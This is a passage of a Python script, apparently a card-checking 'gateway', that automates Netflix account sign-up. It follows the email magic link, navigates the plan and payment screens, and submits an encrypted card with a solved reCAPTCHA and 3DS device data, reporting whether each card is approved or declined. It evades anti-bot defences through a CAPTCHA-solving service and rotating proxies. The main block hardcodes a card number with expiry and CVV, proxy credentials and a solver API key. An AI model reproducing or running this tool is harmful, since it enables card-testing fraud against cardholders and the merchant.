                print(f'[8] Error siguiendo link: {e}')
        print(f'[8] Email verificado: {verified}')
        if not verified: raise Exception('Netflix email verification timeout — magic link not received')

        #//! EPR confirm: after visiting magic link the browser JS posts CLCSScreenUpdate using state
        #   embedded in the EPR page HTML. Extract that state first; fall back to ssus4 indices.
        epr_code    = re.search(r'[?&]code=([^&#\s]+)', magic_link or '').group(1) if magic_link else None
        selplan_ssu = None
        ss_plan     = ss4

        # Extract embedded serverState/serverScreenUpdate from EPR page HTML.
        # The HTML contains JavaScript-style hex escapes (\x2B=+, \x2F=/) — decode them.
        def _decode_js_escapes(s: str) -> str:
            return re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)

        _epr_embedded_ss, _epr_embedded_ssu = None, None
        _ss_hits  = re.findall(r'"serverState"\s*:\s*"([^"]{40,})"', _epr_body)
        _ssu_hits = re.findall(r'"serverScreenUpdate"\s*:\s*"([^"]{40,})"', _epr_body)
        if _ss_hits:  _epr_embedded_ss  = _decode_js_escapes(_ss_hits[0])
        if _ssu_hits: _epr_embedded_ssu = _decode_js_escapes(_ssu_hits[0])
        print(f'[8b] EPR page embedded: ss={bool(_epr_embedded_ss)}({len(_epr_embedded_ss or "")}) ssu={bool(_epr_embedded_ssu)}({len(_epr_embedded_ssu or "")})')

        # Build attempt list: page-embedded state first (JS-escapes now decoded),
        # then ssus4[2] (unknown), ssus4[1] (transitions to registration, not real verify)
        _epr_ref    = f'https://www.netflix.com/epr?code={epr_code}' if epr_code else 'https://www.netflix.com/'
        _h_epc_base = {**headers4, 'referer': _epr_ref, 'x-netflix.request.originating.url': _epr_ref}
        _epr_attempts = []  # (label, fn)

        if _epr_embedded_ss and _epr_embedded_ssu:
            def _mk_emb(_ss, _ssu):
                def _fn():
                    _h = {**_h_epc_base, 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
                    _p = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': _ss, 'serverScreenUpdate': _ssu, 'inputFields': []}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
                    return model.post(url=Netflix.GRAPHQL_URL, headers=_h, json=_p).json()
                return _fn
            _epr_attempts.append(('page-embedded', _mk_emb(_epr_embedded_ss, _epr_embedded_ssu)))

        # ssus4 fallbacks (ssus4[1] transitions to "registration" not real verify, try last)
        for _ei, (_en, _ev) in enumerate(ssus4):
            def _mk_ssu(_ei2, _ev2):
                def _fn():
                    _h = {**_h_epc_base, 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
                    _p = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': ss4, 'serverScreenUpdate': _ev2, 'inputFields': []}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
                    return model.post(url=Netflix.GRAPHQL_URL, headers=_h, json=_p).json()
                return _fn
            _epr_attempts.append((f'ssus4[{_ei}](len={len(_ev)})', _mk_ssu(_ei, _ev)))

        for _elabel, _efn in _epr_attempts:
            r_epc    = _efn()
            out_epc  = ((r_epc.get('data', {}) or {}).get('result') or {}).get('outcomeType', '?')
            eff_epc  = ((r_epc.get('data', {}) or {}).get('result') or {}).get('effect') or {}
            errs_epc = r_epc.get('errors')
            print(f'[8b] EPR({_elabel})  outcome={out_epc}  effect={eff_epc.get("__typename","")}  err={"YES" if errs_epc else "NO"}')
            if errs_epc:
                print(f'    ERR: {errs_epc[0].get("message","?")}')
                continue
            # Success — EPR confirm advanced email verification server-side.
            # Do NOT use SSUs from this response for plan selection — we still need
            # CLCSWebInitSignup#2 which should now return planSelectionContext.
            _r_epc_result = (r_epc.get('data', {}) or {}).get('result') or {}
            _r_epc_lvn    = (_r_epc_result.get('screen') or {}).get('loggingViewName', '?')
            _r_epc_ssus   = Netflix.findSSUs(r_epc)
            print(f'[8b] EPR confirm OK via {_elabel}  LVN={_r_epc_lvn}  SSUs={len(_r_epc_ssus)}')
            break

        if not selplan_ssu:
            #//! Fallback: CLCSWebInitSignup#2 + navigation
            headers6b = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSWebInitSignup'}
            payload6b  = {'operationName': 'CLCSWebInitSignup', 'variables': {'inputNode': 'WELCOME', 'locale': Netflix.LOCALE, 'inputFields': [Netflix.field('flwssn', flwssn)]}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_INIT}}}
            request6b  = model.post(url=Netflix.GRAPHQL_URL, headers=headers6b, json=payload6b).json()
            init6b     = request6b.get('data', {}).get('clcsWebInitSignup') or {}
            screen6b   = init6b.get('screen') or {}
            ss6b       = screen6b.get('serverState') or Netflix.findVal(request6b, 'serverState') or ss
            preload6b  = screen6b.get('preload', [])
            ssus6b     = Netflix.findSSUs(request6b)
            nav_ssu    = ssus6b[0][1] if ssus6b else None
            lvn6b      = Netflix.findVal(request6b, 'loggingViewName') or '?'
            print(f'[9] CLCSWebInitSignup#2  LVN={lvn6b}  SSUs={len(ssus6b)}')
            texts6b = _find_texts(screen6b)
            if texts6b: print(f'    texts: {texts6b[:3]}')
            if not ssus6b: print(f'    keys: {list(init6b.keys())}')
            if preload6b:
                headers7 = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSPreloadScreens'}
                payload7  = {'operationName': 'CLCSPreloadScreens', 'variables': {'serverStates': preload6b}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_PRELOAD}}}
                model.post(url=Netflix.GRAPHQL_URL, headers=headers7, json=payload7)
            if not nav_ssu: raise Exception('No navigation SSU from CLCSWebInitSignup#2')
            headers8 = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
            # If authenticated (NetflixId cookie present), submit userLoginId so Netflix can bind the session
            nav_inputs8 = []
            if 'identification' in lvn6b and 'NetflixId' in dict(model.cookies):
                nav_inputs8 = [Netflix.field('userLoginId', tm_email), Netflix.field('countryCode', 'MX'), Netflix.field('countryIsoCode', 'MX')]
                print(f'[10] Has NetflixId cookie — submitting userLoginId to bind session')
            payload8 = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': ss6b, 'serverScreenUpdate': nav_ssu, 'inputFields': nav_inputs8}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
            request8 = model.post(url=Netflix.GRAPHQL_URL, headers=headers8, json=payload8).json()
            ss8      = ((request8.get('data', {}).get('result') or {}).get('screen') or {}).get('serverState') or Netflix.findVal(request8, 'serverState') or ss6b
            ssus8    = Netflix.findSSUs(request8)
            lvn8     = Netflix.findVal(request8, 'loggingViewName') or '?'
            out8     = ((request8.get('data', {}) or {}).get('result') or {}).get('outcomeType', '?')
            texts8   = _find_texts((request8.get('data', {}) or {}).get('result') or {})
            print(f'[10] Navigation  LVN={lvn8}  outcome={out8}  SSUs={len(ssus8)}')
            if texts8: print(f'     texts: {texts8[:3]}')
            if request8.get('errors'): print(f'     ERRORS: {request8["errors"]}')
            selplan_ssu = ssus8[0][1] if ssus8 else None
            ss_plan     = ss8
            if not selplan_ssu: raise Exception('No selectPlan SSU from navigation response')

        #//! Request 9: CLCSScreenUpdate/selectPlan (SSU[0] from navigation response)
        headers9 = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
        payload9 = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': ss_plan, 'serverScreenUpdate': selplan_ssu, 'inputFields': [Netflix.field('planChoice', Netflix.PLAN_ID)]}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
        request9 = model.post(url = Netflix.GRAPHQL_URL, headers = headers9, json = payload9).json()
        ss9      = ((request9.get('data', {}).get('result') or {}).get('screen') or {}).get('serverState') or Netflix.findVal(request9, 'serverState')
        ssus9    = Netflix.findSSUs(request9)
        _r9_result = (request9.get('data', {}) or {}).get('result') or {}
        _r9_lvn    = (_r9_result.get('screen') or {}).get('loggingViewName', '?')
        _r9_out    = _r9_result.get('outcomeType', '?')
        _r9_texts  = _find_texts(_r9_result)
        print(f'[R9] selectPlan  LVN={_r9_lvn}  outcome={_r9_out}  SSUs={len(ssus9)}')
        if request9.get('errors'): print(f'     ERRORS: {request9["errors"]}')
        if not ssus9: raise Exception('No SSUs from selectPlan response')

        #//! Request 10: Navigate to payment screen (handles webSignupUpgradeOnUs + normal planSelection)
        # Always follow SSU[0] at each hop until publicKey appears (max 5 hops)
        _nav_ss    = ss9
        _nav_ssus  = list(ssus9)
        _pub_key   = None
        _r10_final = None
        _h10_base  = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
        for _hop in range(5):
            if not _nav_ssus: break
            _sn, _sv = _nav_ssus[0]
            _h10 = {**_h10_base, 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.toplevel.uuid': Netflix.uuid()}
            _p10 = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': _nav_ss, 'serverScreenUpdate': _sv, 'inputFields': []}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
            _r10      = model.post(url=Netflix.GRAPHQL_URL, headers=_h10, json=_p10).json()
            _r10_res  = (_r10.get('data', {}) or {}).get('result') or {}
            _r10_lvn  = (_r10_res.get('screen') or {}).get('loggingViewName', '?')
            _r10_ssus = Netflix.findSSUs(_r10)
            _pk10     = Netflix.findVal(_r10, 'publicKey')
            print(f'[R10] hop={_hop}  LVN={_r10_lvn}  pk={bool(_pk10)}  SSUs={len(_r10_ssus)}')
            _nav_ss = ((_r10.get('data', {}).get('result') or {}).get('screen') or {}).get('serverState') or Netflix.findVal(_r10, 'serverState') or _nav_ss
            if _pk10 and 'modulus' in _pk10:
                _pub_key   = _pk10
                _r10_final = _r10
                break
            _nav_ssus = _r10_ssus

        if not _pub_key or 'modulus' not in _pub_key: raise Exception('publicKey no encontrado después de navegar pantallas de upgrade/payment')
        request9   = _r10_final
        ss9        = _nav_ss
        public_key = _pub_key
        kid          = public_key['kid']
        modulus      = public_key['modulus']
        cardinal_jwt = Netflix.findVal(Netflix.findVal(request9, 'emvco3dsDeviceCollection') or {}, 'token')
        print(f'[ENTER_CARD] cardinal_jwt={bool(cardinal_jwt)}  jwt_len={len(cardinal_jwt or "")}')
        ssus_save    = Netflix.findSSUs(request9)
        print(f'[ENTER_CARD] SSUs={len(ssus_save)}  names={[n for n,_ in ssus_save]}')
        addcard_ssu  = ssus_save[-1][1] if ssus_save else None  # last SSU = addCardAndStartMembership
        if not addcard_ssu: raise Exception('No addCardAndStartMembership SSU from saveSelectedPaymentOption response')

        #//! Request 10-16: Cardinal 3DS Device Collection
        cardinal_response = Netflix.doCardinal(model, card, cardinal_jwt)
        print(f'[Cardinal] response={bool(cardinal_response)}  len={len(cardinal_response or "")}')

        #//! Encrypt Card (RSA-OAEP SHA-1)
        enc = CseNetflixPayment.encrypt(kid=kid, pk=modulus, data={'cc': {'num': card['number'], 'expMon': card['month'], 'expYr': card['year'], 'cvv': card['cvv']}})
        encrypted_card = '{ "VERSION": ' + str(enc['response']['VERSION']) + ', "PAYLOAD":"' + enc['response']['PAYLOAD'] + '"}'

        #//! Request 17: Esperar reCAPTCHA de pago (pre-solved en background desde el inicio)
        _cap2_thread.join(timeout=120)
        cap2 = _cap2_box[0]
        if not cap2: raise Exception('reCAPTCHA payment solve failed')
        print(f'[17] reCAPTCHA pago listo')

        #//! Request 18: CLCSScreenUpdate/addCardAndStartMembership → resultado final
        headers18 = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
        payload18 = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': ss9, 'serverScreenUpdate': addcard_ssu, 'inputFields': [Netflix.field('name', f'{data.fn} {data.ln}'), Netflix.field('encryptedCard', encrypted_card), Netflix.field('iAgree', True), Netflix.field('allowLocalNetworkProcessing', True), Netflix.field('comboCardProcessingType', 'CREDIT'), Netflix.field('allowCardChaining', True), Netflix.field('deviceDataCollectionFallback', Netflix.buildBrowserData()), Netflix.field('deviceDataCollectionResponseToken', cardinal_response or ''), Netflix.field('deviceDataCollectionWindowSize', '04'), Netflix.field('recaptchaResponseTime', random.randint(350, 450)), Netflix.field('recaptchaResponseToken', cap2)]}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
        request18 = model.post(url = Netflix.GRAPHQL_URL, headers = headers18, json = payload18).json()
        _r18_res  = (request18.get('data', {}) or {}).get('result') or {}
        _r18_out  = _r18_res.get('outcomeType', '?')
        _r18_eff  = (_r18_res.get('effect') or {}).get('__typename', '?')
        _r18_lvn  = (_r18_res.get('screen') or {}).get('loggingViewName', '?')
        print(f'[18] addCard  outcome={_r18_out}  effect={_r18_eff}  LVN={_r18_lvn}')
        if request18.get('errors'): print(f'     ERRORS: {request18["errors"]}')

        #//! Request 19: poll CLCSPollForScreenUpdate (si disponible)
        ssus18      = Netflix.findSSUs(request18)
        _r18_effect = (request18.get('data', {}).get('result') or {}).get('effect') or {}
        poll_ssu    = None
        if _r18_effect.get('__typename') == 'CLCSPollForScreenUpdate':
            _poll_nodes = _r18_effect.get('nodes', [])
            poll_ssu    = next((n.get('serverScreenUpdate', '') for n in _poll_nodes if n.get('serverScreenUpdate')), None)
        if not poll_ssu:
            poll_ssu = ssus18[0][1] if ssus18 else None  # SSU[0] from addCard response
        if poll_ssu:
            ss_poll    = ((request18.get('data', {}).get('result') or {}).get('screen') or {}).get('serverState') or Netflix.findVal(request18, 'serverState') or ss9
            req_last   = request18
            final_resp = request18
            for attempt in range(12):
                interval_ms = 1000
                try: interval_ms = req_last['data']['result']['effect']['nodes'][0].get('intervalMs', 1000)
                except: pass
                time.sleep(interval_ms / 1000 + 0.3)
                headers19 = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
                payload19 = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': ss_poll, 'serverScreenUpdate': poll_ssu, 'inputFields': []}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
                req_last   = model.post(url = Netflix.GRAPHQL_URL, headers = headers19, json = payload19).json()
                final_resp = req_last
                res_poll   = req_last.get('data', {}).get('result') or {}
                out_poll   = res_poll.get('outcomeType', '')
                lvn_poll   = (res_poll.get('screen') or {}).get('loggingViewName', '')
                eff_type   = (res_poll.get('effect') or {}).get('__typename', '')
                print(f'[19] poll#{attempt}  outcome={out_poll}  eff={eff_type}  LVN={lvn_poll}')
                if out_poll == 'CLCSScreenUpdateTransition' or lvn_poll == 'ENTER_CARD': break
                if eff_type == 'CLCSPollForScreenUpdate':
                    _poll_nodes  = (res_poll.get('effect') or {}).get('nodes', [])
                    _ssus_last   = Netflix.findSSUs(req_last)
                    new_poll     = next((n.get('serverScreenUpdate', '') for n in _poll_nodes if n.get('serverScreenUpdate')), None) or (_ssus_last[0][1] if _ssus_last else None)
                    if new_poll: poll_ssu = new_poll
                    continue
                break
            response = Netflix.buildBillingResponse(card, final_resp, data)
            if not response.get('success') and response.get('response') == 'CLCSScreenUpdateEffect':
                alert_msg = ''
                try:
                    for node in request18['data']['result']['effect']['nodes']:
                        alert_msg = node['errorHandling']['alert']['message']['value']
                        if alert_msg: break
                except: pass
                response['response']    = alert_msg or 'Declined'
                response['apiResponse'] = 'Declined ❌'
        else:
            response = Netflix.buildBillingResponse(card, request18, data)
        return response | {'retries': str(retries), 'gateway': 'Netflix Plans Subscription'}

    except Exception as e:
        print(f'[EXC] retry={retries}  {type(e).__name__}: {e}')
        if retries < 6:
            time.sleep(2)
            return processNetflixFlow(cardInput, proxy, capsolver_key, retries + 1)  # proxy list preserved
        else: return {'status': False, 'message': f'Error: {e}', 'card': f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}", 'retries': str(retries), 'gateway': 'Netflix Plans Subscription'}




if __name__ == '__main__':

    def _rand_sess(n=10):
        import random as _r, string as _s
        return ''.join(_r.choices(_s.ascii_letters + _s.digits, k=n))

    _PROXIES = [f'smart-jokizui_area-US_life-5_session-{_rand_sess()}:00000000kz@proxy.smartproxy.net:3120' for _ in range(20)]

    gate = processNetflixFlow(
        cardInput = "5101251135749352|06|2034|138",
        proxy = _PROXIES,
        capsolver_key = 'CAP-CA87D2ACEA24D7425C64C9502C37F76EEC62185B7BF1E889034A2F1364DF7C16'
    )

    print(json.dumps(gate, indent=4, ensure_ascii=False))
